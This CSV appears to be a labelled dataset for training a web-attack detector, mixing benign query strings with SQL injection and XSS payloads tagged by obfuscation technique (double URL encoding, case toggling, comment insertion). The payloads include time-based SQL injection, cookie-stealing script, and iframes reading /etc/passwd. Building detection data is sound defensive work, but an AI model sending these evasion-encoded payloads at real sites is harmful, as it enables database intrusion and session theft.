payload,label,techniques
price_min=1167&qty=8200&price_max=8681,benign,
theme=dark&search=orders,benign,
alert%2528%2522test%2522%2529,xss,double_url_encode
OR%0apg_SLEEP(5)--,sqli,whitespace+case_toggle+comment_insertion
qty=4948&lang=en,benign,
%3Ciframe%2509src%3Dhttp%3A%2F%2Fxss.rocks%2Fscriptlet.html%250a%3C,xss,whitespace+url_encode+case_toggle
ORDER%2520BY%203,sqli,partial_url_encode+url_encode
"benchmark(10000000,MD5(1))%23",sqli,comment_insertion+case_toggle+partial_url_encode
tab=report,benign,
email=book@example.com&currency=usd,benign,
callback=profile&currency=usd&q=settings,benign,
color=foxtrot,benign,
offset=7362,benign,
benchmark%252850000000%252CMD5%25281%2529%2529%2523,sqli,double_url_encode
ORDER%2520BY%252020,sqli,comment_insertion+double_url_encode+case_toggle
%252527%2529%252529%25253Bwaitfor%2520delay%2520%2525270%25253A0%25253A5%252527--,sqli,double_url_encode+partial_url_encode
user_id=6816,benign,
tab=dashboard,benign,
<img src%3D%22xxx%22%20onerror=%22document.write\u0028%27\%3Ciframe%20src%3Dfile%3A%2F//etc%2Fpasswd&gt;\\u003C%2Fiframe&#62;&#39;)&#34;%2F%3E,xss,partial_url_encode+comment_insertion+unicode_substitution
city=citra&q=surakarta&search=book,benign,
id=6671&offset=9153&search=orders,benign,
%5C,sqli,partial_url_encode
session=3691889&callback=profile,benign,
%22>\u003Csvg&gt;&lt;script&#62;alert%281%29&lt;/script&#62;,xss,whitespace+unicode_substitution
currency=usd&price_min=945&id=7479,benign,
search=invoice,benign,
size=m&lang=id&search=laptop,benign,
offset=50&view=grid,benign,
"ORDER	BY
24",sqli,whitespace+case_toggle+comment_insertion
qty=3250&format=json,benign,
tab=laptop,benign,
WHere%201=1%20anD%201=1,sqli,case_toggle+partial_url_encode
%3CsCript%3Ealert%28document.domain%29%3C%252FsCript%3E,xss,partial_url_encode+url_encode+case_toggle
AS%252520INJECTX%252520WHERE%2525201%25253D1%252520AND%2525201%25253D1--,sqli,unicode_substitution+url_encode+double_url_encode
color=laptop,benign,
theme=dark&view=grid,benign,
name=delta,benign,
%25253Caudio%252520src%252Fonerror%25253Dconfirm%252528123%2529%253E,xss,double_url_encode+partial_url_encode+whitespace
%25%27%20AnD%208310%3D8310%20anD%20%27%25%27%3D%27,sqli,case_toggle+url_encode
category=book&ref=citra&lang=en,benign,
qty=7470&user_id=8588,benign,
redirect=/home&price_max=6732&tab=foxtrot,benign,
search=echo,benign,
offset=2527,benign,
price_min=2435&size=m&email=delta@example.com,benign,
OR x%3Dy--,sqli,partial_url_encode
ORDER%2520BY%252031337,sqli,case_toggle+double_url_encode
name=book,benign,
page=3922&tab=budget&currency=usd,benign,
size=m&token=122f063,benign,
AND%091,sqli,whitespace+url_encode
ORDER%20BY%2021,sqli,comment_insertion+fallback_full_url_encode
ref=laptop&size=m&lang=en,benign,
ORDER%0aBY/**/7,sqli,whitespace+comment_insertion
ORDER%2520BY%25202,sqli,double_url_encode+comment_insertion
format=json&lang=id&coupon=surakarta,benign,
ORDER%2520BY%25204,sqli,url_encode+comment_insertion+partial_url_encode
format=json&price_min=6036,benign,
price_max=9273&tab=dashboard&sort=desc,benign,
currency=usd&sort=asc&user_id=1209,benign,
callback=shoes&price_max=5861&sort=asc,benign,
token=3d92027,benign,
%3Cscript%3Ealert%281%29%3C%2Fscript%3E,xss,case_toggle+fallback_full_url_encode
category=invoice,benign,
ORDER%250aBY%0a12,sqli,whitespace+partial_url_encode
lang=en&redirect=/home&qty=816,benign,
page=6451&name=citra&lang=id,benign,
ORDER%20BY%209,sqli,partial_url_encode
%3Cscript%3Ealert%28%22test%22%29%3B%3C%2Fscript%3E,xss,case_toggle+fallback_full_url_encode
lang=en&price_max=2911,benign,
view=grid&name=jakarta,benign,
prompt%28document.cookie%29,xss,whitespace+url_encode+case_toggle
coupon=book&callback=report,benign,
AND 7300%3D7300%20AND%20%28'pKlZ%27%3D'pKlZ,sqli,partial_url_encode
<BODY	ONLOAD=alert(document.cookie)>,xss,whitespace
user_id=4106,benign,
price_max=853&format=json&size=m,benign,
token=404b88a,benign,
"-1 unIOn SELeCT 1 INTO @,@",sqli,unicode_substitution+case_toggle
session=203f2d2&view=grid&q=delta,benign,
category=orders&ref=jakarta&price_min=4307,benign,
sort=asc&size=m,benign,
city=shoes&limit=526&size=m,benign,
ref=shoes&limit=6350&name=shoes,benign,
%3Cscript%20src%3D%22http%3A//192.168.1.6%2Ftest.js%22 >%3C%2Fscript%3E,xss,partial_url_encode+unicode_substitution+case_toggle
ORDER%09BY%096,sqli,unicode_substitution+whitespace
ORDER%2520BY%252011,sqli,partial_url_encode+double_url_encode
tab=budget&coupon=dashboard&format=json,benign,
%25253Cimg%252520src%25253D%2522abc%2522%252520onerror%253D%252522alert%25281%2529%2522%25253E,xss,case_toggle+partial_url_encode+double_url_encode
%253E%253C%252Fse%252F%252A%252150000%252A%252Flect%253E%253Cimg%252520src%253D1%252520onerror%253Dalert%25281%2529%253E,xss,comment_insertion+double_url_encode
aND 7300=7300 aND 'pKlZ'='pKlZ,sqli,case_toggle
price_max=4107,benign,
ORDER%25252520BY%25252025,sqli,partial_url_encode+double_url_encode+url_encode
ORDER%20BY%205,sqli,url_encode
email=foxtrot@example.com,benign,
color=surakarta&format=json,benign,
name=dashboard&theme=dark,benign,
theme=dark&lang=id&ref=alice,benign,
price_max=619,benign,
OR/**/1=1--,sqli,whitespace
user_id=7171,benign,
redirect=/home&category=book&search=jakarta,benign,
%2F,sqli,whitespace+case_toggle+fallback_full_url_encode
q=echo,benign,
%2526%2526SLEEP%25285%2529,sqli,case_toggle+double_url_encode+whitespace
%27%20and%201%20in%20%28select%20min%28name%29%20from%20sysobjects%20where%20xtype%20%3D%20%27U%27%20and%20name%20%3E%20%27.%27%29%20--,sqli,comment_insertion+url_encode
sort=desc&token=2777484&lang=id,benign,
size=m&session=22179f5,benign,
format=json&coupon=foxtrot,benign,
theme=dark&size=m&redirect=/home,benign,
email=echo@example.com&token=32e84b3&redirect=/home,benign,
ORDER%20BY%2026,sqli,unicode_substitution+fallback_full_url_encode
q=report&price_max=6485,benign,
"%3Clink%20rel%3Dattachment%20href=""file%3A/%2F/etc/passwd""%3E",xss,case_toggle+partial_url_encode
offset=8999,benign,
%3Ciframe%2520onload%253Dprint%2528%2529%3E%3C%2Fiframe%3E,xss,partial_url_encode+url_encode
callback=alice&city=camera&limit=1011,benign,
ORDER%25252520BY%2525208,sqli,double_url_encode+partial_url_encode+url_encode
%252522%2525253E%25253Cscript%2525253Ealert%252525281%252529%2525253C%2525252Fscript%2525253E,xss,partial_url_encode+double_url_encode+url_encode
format=json,benign,
offset=9968,benign,
ORDER BY%2013,sqli,partial_url_encode+comment_insertion
price_max=481&limit=7729,benign,
And%20true,sqli,partial_url_encode+case_toggle
%27;waitfor%20delay %26#39%3B0:0:5\u0027--,sqli,unicode_substitution+partial_url_encode+case_toggle
city=laptop&name=delta&session=331056d,benign,
IF%2525287423%25253D7423%252529%252520SELECT%2525207423%252520ELSE%252520DROP%252520FUNCTION%252520xcjl--,sqli,url_encode+comment_insertion+double_url_encode
price_max=2505,benign,
"ORDER
BY	28",sqli,whitespace
ORDER%20BY%20SLEEP%285%29%23,sqli,case_toggle+url_encode
theme=dark&color=orders,benign,
%3Cbody%20style%3D%22background-color%3Ared%22%3E,xss,case_toggle+fallback_full_url_encode
\u0027	or%0a&#34;,sqli,whitespace+unicode_substitution
view=grid&lang=id&search=delta,benign,
"'%29%3Bwaitfor%0Adelay
%270:0:5'--",sqli,whitespace+partial_url_encode
price_max=508&currency=usd&email=shoes@example.com,benign,
%252527%25253Balert%252528%2525271%252527%252529%25253B%252527,xss,url_encode+double_url_encode
ORDER%20BY%2022,sqli,partial_url_encode+unicode_substitution+fallback_full_url_encode
page=5214&search=camera&price_max=2305,benign,
sort=desc&theme=dark&color=alice,benign,
name=phone,benign,
ORDER%20BY%2019,sqli,url_encode+whitespace
%2522%2520OR%2520%2522%2522%2520%253D%2520%2522,sqli,double_url_encode+comment_insertion
session=31b7cb4&sort=asc,benign,
prompt%2528123%2529,xss,double_url_encode+comment_insertion+partial_url_encode
1	or	sleep(5)#,sqli,whitespace
size=m&id=2589,benign,
HAVING%201%3D1%23,sqli,url_encode
tab=foxtrot,benign,
redirect=/home&price_max=1597&email=invoice@example.com,benign,
page=6071&format=json,benign,
1%2527%252520ORDER%252520BY%2525201%252C2--%25252B,sqli,double_url_encode+unicode_substitution+partial_url_encode
ORDER%09BY/%2A*%2F17,sqli,whitespace+comment_insertion+partial_url_encode
view=grid&id=6069&currency=usd,benign,
lang=en&session=57ce51b,benign,
ref=budi&lang=id&view=grid,benign,
id=8741&email=delta@example.com&search=settings,benign,
